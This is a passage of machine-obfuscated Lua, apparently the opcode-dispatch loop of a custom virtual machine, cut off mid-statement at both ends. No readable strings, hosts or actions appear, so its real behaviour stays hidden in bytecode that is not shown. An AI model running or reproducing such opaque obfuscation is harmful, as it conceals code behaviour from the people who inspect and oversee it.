bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba=y[514]local bb={w[ba](r(w,ba+1,y[14]))};local bc=0;for bd=ba,y[463]do bc=bc+1;w[bd]=bb[bc];end;end;elseif 70>=z then if 58>=z then if 52>=z then if 49>=z then if 47>=z then local ba=y[514];local bb=w[y[14]];w[ba+1]=bb;w[ba]=bb[w[y[463]]];elseif 48<z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];for ba=y[514],y[14],1 do w[ba]=nil;end;n=n+1;y=f[n];n=y[14];else do return end;end;elseif z<=50 then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba>2 then w[y[514]]=w[y[14]][y[463]];else bd=nil end end else if ba<=5 then if ba<5 then n=n+1;else y=f[n];end else if 6<ba then n=n+1;else w[y[514]]=w[y[14]];end end end else if ba<=11 then if ba<=9 then if ba<9 then y=f[n];else w[y[514]]=h[y[14]];end else if 11~=ba then n=n+1;else y=f[n];end end else if ba<=13 then if ba==12 then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if 14==ba then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if ba>16 then y=f[n];else n=n+1;end else if 18<ba then n=n+1;else w[y[514]]=h[y[14]];end end else if ba<=21 then if ba~=21 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end else if ba~=23 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if 24==ba then w[y[514]]=w[y[14]][y[463]];else n=n+1;end else if ba==26 then y=f[n];else bd=y[14];end end else if ba<=29 then if 28<ba then bb=k(w,g,bd,bc);else bc=y[463];end else if 30==ba then w[y[514]]=bb;else break end end end end end ba=ba+1 end elseif z<52 then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 55>=z then if z<=53 then a(c,e);elseif not(z~=54)then local ba=0 while true do if ba<=13 then if ba<=6 then if ba<=2 then if ba<=0 then w[y[514]]=y[14];else if 1<ba then y=f[n];else n=n+1;end end else if ba<=4 then if ba>3 then n=n+1;else w[y[514]]=y[14];end else if 6>ba then y=f[n];else w[y[514]][w[y[14]]]=w[y[463]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8<ba then w[y[514]]=y[14];else y=f[n];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<13 then w[y[514]]=y[14];else n=n+1;end end end end else if ba<=20 then if ba<=16 then if ba<=14 then y=f[n];else if 15<ba then n=n+1;else w[y[514]][w[y[14]]]=w[y[463]];end end else if ba<=18 then if 17==ba then y=f[n];else w[y[514]][w[y[14]]]=w[y[463]];end else if ba~=20 then n=n+1;else y=f[n];end end end else if ba<=24 then if ba<=22 then if ba>21 then n=n+1;else w[y[514]]=y[14];end else if 24>ba then y=f[n];else w[y[514]]=y[14];end end else if ba<=26 then if 26>ba then n=n+1;else y=f[n];end else if 28>ba then w[y[514]][w[y[14]]]=w[y[463]];else break end end end end end ba=ba+1 end else w[y[514]]();end;elseif 56>=z then local ba=w[y[463]];if not ba then n=n+1;else w[y[514]]=ba;n=y[14];end;elseif z<58 then local ba;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 64>=z then if z<=61 then if z<=59 then local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba<=4)then if(ba<=1)then if(1>ba)then bb=nil else bc=nil end else if(ba<2 or ba==2)then bd=nil else if not(3~=ba)then w[y[514]]=h[y[14]];else n=(n+1);end end end else if ba<=6 then if(ba==5)then y=f[n];else w[y[514]]=h[y[14]];end else if(ba<7 or ba==7)then n=n+1;else if not(8~=ba)then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end end else if(ba<14 or ba==14)then if ba<=11 then if(ba<11)then n=n+1;else y=f[n];end else if(ba<=12)then w[y[514]]=w[y[14]][w[y[463]]];else if(14~=ba)then n=n+1;else y=f[n];end end end else if(ba==16 or ba<16)then if not(16==ba)then bd=y[514]else bc={w[bd](w[bd+1])};end else if(ba<=17)then bb=0;else if ba<19 then for be=bd,y[463]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=(ba+1)end elseif 61~=z then w[y[514]][w[y[14]]]=w[y[463]];else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])end;elseif 62>=z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;elseif 63<z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=67 then if z<=65 then local ba=y[514]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[463]do bc=bc+1;w[bd]=bb[bc];end elseif z>66 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=false;n=n+1;y=f[n];ba=y[514]w[ba](w[ba+1])end;elseif 68>=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end elseif 70>z then local ba;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else a(c,e);end;elseif 82>=z then if z<=76 then if 73>=z then if z<=71 then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z~=73 then local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else w[y[514]]=y[14];end;elseif z<=74 then if(y[514]<w[y[463]])then n=n+1;else n=y[14];end;elseif z<76 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514];w[ba]=w[ba]-w[ba+2];n=y[14];else local ba=y[514];do return r(w,ba,p)end;end;elseif z<=79 then if z<=77 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[514]]=w[y[14]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[514]]=y[14];else n=n+1;end else if ba~=7 then y=f[n];else w[y[514]]=y[14];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if 10<ba then n=n+1;else w[y[514]]=y[14];end end else if ba<=13 then if 12==ba then y=f[n];else bb=y[514]end else if 14==ba then w[bb]=w[bb](r(w,bb+1,y[14]))else break end end end end ba=ba+1 end elseif z>78 then w[y[514]]=w[y[14]]%w[y[463]];else local ba;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif z<=80 then local ba;w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif 82~=z then local ba=y[514]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[463]do bc=bc+1;w[bd]=bb[bc];end else j[y[14]]=w[y[514]];end;elseif z<=88 then if(z<=85)then if(z==83 or z<83)then local ba=0 while true do if ba<=6 then if(ba==2 or ba<2)then if(ba==0 or ba<0)then w[y[514]]=w[y[14]][y[463]];else if 2~=ba then n=(n+1);else y=f[n];end end else if(ba<4 or ba==4)then if 3<ba then n=n+1;else w[y[514]]=w[y[14]][y[463]];end else if not(ba~=5)then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if(ba<=9)then if(ba<=7)then n=(n+1);else if 8<ba then w[y[514]]=w[y[14]][y[463]];else y=f[n];end end else if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba>12 then break else if w[y[514]]then n=(n+1);else n=y[14];end;end end end end ba=(ba+1)end elseif(z<85)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else w[y[514]]=j[y[14]];end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba==6 then y=f[n];else w[y[514]]=y[14];end end else if ba<=8 then n=n+1;else if 10~=ba then y=f[n];else w[y[514]]=y[14];end end end end else if ba<=15 then if ba<=12 then if ba<12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[514]]=y[14];else if ba==14 then n=n+1;else y=f[n];end end end else if ba<=18 then if ba<=16 then w[y[514]]=y[14];else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[514]else if ba<21 then w[bb]=w[bb](r(w,bb+1,y[14]))else break end end end end end ba=ba+1 end else local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then bc=nil else w[y[514]]={};end end else if ba<=3 then n=n+1;else if 5~=ba then y=f[n];else w[y[514]]=h[y[14]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba<8 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=9 then n=n+1;else if 11~=ba then y=f[n];else w[y[514]]=h[y[14]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if ba==13 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end else if ba<=15 then n=n+1;else if ba<17 then y=f[n];else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if ba~=20 then y=f[n];else w[y[514]]={};end end else if ba<=22 then if ba~=22 then n=n+1;else y=f[n];end else if 24~=ba then w[y[514]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if ba>26 then n=n+1;else w[y[514]]=h[y[14]];end end else if ba<=28 then y=f[n];else if ba>29 then n=n+1;else w[y[514]][y[14]]=w[y[463]];end end end else if ba<=33 then if ba<=31 then y=f[n];else if 32==ba then w[y[514]]=h[y[14]];else n=n+1;end end else if ba<=35 then if ba~=35 then y=f[n];else w[y[514]][y[14]]=w[y[463]];end else if 36==ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[514]][y[14]]=w[y[463]];else if ba>39 then y=f[n];else n=n+1;end end else if ba<=41 then w[y[514]]={r({},1,y[14])};else if ba==42 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[514]]=w[y[14]];else if 45==ba then n=n+1;else y=f[n];end end else if ba<=48 then if 47<ba then bb=w[bc];else bc=y[514];end else if 49==ba then for bd=bc+1,y[14]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end end;elseif(86>z or 86==z)then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[514]]=w[y[14]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if 5~=ba then w[y[514]]=y[14];else n=n+1;end else if ba~=7 then y=f[n];else w[y[514]]=y[14];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba~=11 then w[y[514]]=y[14];else n=n+1;end end else if ba<=13 then if ba<13 then y=f[n];else bb=y[514]end else if 15~=ba then w[bb]=w[bb](r(w,bb+1,y[14]))else break end end end end ba=ba+1 end elseif not(z==88)then local ba,bb,bc,bd=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[514]]=h[y[14]];else n=n+1;end end end else if ba<=7 then if ba<=5 then y=f[n];else if 6<ba then n=n+1;else w[y[514]]=w[y[14]][y[463]];end end else if ba<=8 then y=f[n];else if 10~=ba then w[y[514]]=w[y[14]][y[463]];else n=n+1;end end end end else if ba<=16 then if ba<=13 then if ba<=11 then y=f[n];else if 13>ba then w[y[514]]=h[y[14]];else n=n+1;end end else if ba<=14 then y=f[n];else if ba>15 then n=n+1;else w[y[514]]=w[y[14]][y[463]];end end end else if ba<=19 then if ba<=17 then y=f[n];else if 18<ba then bc=y[463];else bd=y[14];end end else if ba<=20 then bb=k(w,g,bd,bc);else if ba<22 then w[y[514]]=bb;else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[514]]=w[y[14]][w[y[463]]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 4==ba then w[y[514]]=w[y[14]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[514]]=y[14];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9<ba then w[y[514]]=y[14];else y=f[n];end else if ba<=11 then n=n+1;else if ba>12 then w[y[514]]=y[14];else y=f[n];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[514]else if 18~=ba then w[bb]=w[bb](r(w,bb+1,y[14]))else break end end end end end ba=ba+1 end end;elseif 91>=z then if z<=89 then local ba=y[514]w[ba](r(w,(ba+1),p))elseif z~=91 then local ba=d[y[14]];local bb={};local bc={};for bd=1,y[463]do n=n+1;local be=f[n];if be[70]==290 then bc[bd-1]={w,be[14]};else bc[bd-1]={h,be[14]};end;v[#v+1]=bc;end;m(bb,{['\95\95\105\110\100\101\120']=function(bd,bd)local bd=bc[bd];return bd[1][bd[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(bd,bd,be)local bc=bc[bd]bc[1][bc[2]]=be;end;});w[y[514]]=b(ba,bb,j);else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514];do return w[ba](r(w,ba+1,y[14]))end;n=n+1;y=f[n];ba=y[514];do return r(w,ba,p)end;n=n+1;y=f[n];n=y[14];end;elseif 92>=z then local ba;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()elseif z==93 then for ba=y[514],y[14],1 do w[ba]=nil;end;else local ba=y[514];local bb=w[y[14]];w[ba+1]=bb;w[ba]=bb[y[463]];end;elseif z<=141 then if z<=117 then if 105>=z then if z<=99 then if 96>=z then if 96>z then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else w[y[514]]=w[y[14]]+y[463];end;elseif z<=97 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[514]]=h[y[14]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba~=5 then w[y[514]]=y[14];else n=n+1;end else if 7~=ba then y=f[n];else w[y[514]]=y[14];end end end else if ba<=11 then if ba<=9 then if 9~=ba then n=n+1;else y=f[n];end else if ba~=11 then w[y[514]]=y[14];else n=n+1;end end else if ba<=13 then if ba>12 then bb=y[514]else y=f[n];end else if 14==ba then w[bb]=w[bb](r(w,bb+1,y[14]))else break end end end end ba=ba+1 end elseif 99~=z then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 102>=z then if z<=100 then local ba=y[514]w[ba](w[ba+1])elseif 102>z then w[y[514]]={};else local ba=y[514]w[ba]=w[ba](r(w,ba+1,p))end;elseif 103>=z then local ba;w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif 105~=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()else local ba;local bb,bc;local bd;w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];bd=y[514]bb,bc=i(w[bd](r(w,bd+1,y[14])))p=bc+bd-1 ba=0;for bc=bd,p do ba=ba+1;w[bc]=bb[ba];end;end;elseif z<=111 then if 108>=z then if 106>=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba]()elseif 108~=z then local ba=y[514];w[ba]=w[ba]-w[ba+2];n=y[14];else local ba;local bb;w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={r({},1,y[14])};n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];bb=y[514];ba=w[bb];for bc=bb+1,y[14]do t(ba,w[bc])end;end;elseif 109>=z then local ba=y[514]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;elseif z>110 then local ba;w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](w[ba+1])else w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if w[y[514]]then n=n+1;else n=y[14];end;end;elseif z<=114 then if z<=112 then local ba=y[514]w[ba](r(w,(ba+1),y[14]))elseif 114~=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else w[y[514]]=w[y[14]]-y[463];end;elseif z<=115 then local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 1<ba then n=n+1;else w[y[514]]=w[y[14]]%w[y[463]];end end else if ba<=3 then y=f[n];else if ba~=5 then w[y[514]]=w[y[14]]+y[463];else n=n+1;end end end else if ba<=8 then if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[514]]=h[y[14]];end end else if ba<=9 then y=f[n];else if 10<ba then n=n+1;else w[y[514]]=w[y[14]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if 13<ba then n=n+1;else w[y[514]]=w[y[14]];end end else if ba<=15 then y=f[n];else if 17~=ba then w[y[514]]=w[y[14]];else n=n+1;end end end else if ba<=20 then if ba<=18 then y=f[n];else if 19<ba then n=n+1;else w[y[514]]=w[y[14]];end end else if ba<=22 then if ba<22 then y=f[n];else bb=y[514]end else if ba>23 then break else w[bb]=w[bb](r(w,bb+1,y[14]))end end end end end ba=ba+1 end elseif 117~=z then local ba;w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]][y[14]]=y[463];n=n+1;y=f[n];w[y[514]][y[14]]=w[y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))else local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))end;elseif 129>=z then if z<=123 then if 120>=z then if 118>=z then local ba;w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];w[y[514]]=y[14];n=n+1;y=f[n];ba=y[514]w[ba]=w[ba](r(w,ba+1,y[14]))elseif z==119 then local ba;local bb;local bc;w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=h[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=w[y[14]][w[y[463]]];n=n+1;y=f[n];bc=y[514]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[463]do ba=ba+1;w[bd]=bb[ba];end else w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]=j[y[14]];n=n+1;y=f[n];w[y[514]]={};n=n+1;y=f[n];w[y[514]]=w[y[14]][y[463]];n=n+1;y=f[n];if not w[y[514]]then n=n+1;else n=y[14];end;end;elseif z<=121 then local ba=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then w={};else if 2~=ba then for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;else n=n+1;end end else if ba<=4 then if 4>ba then y=f[n];else w[y[514]]=h[y[14]];end else if 5<ba then y=f[n];else n=n+1;end end end else if ba<=10 then if ba<=8 then if 8~=ba then 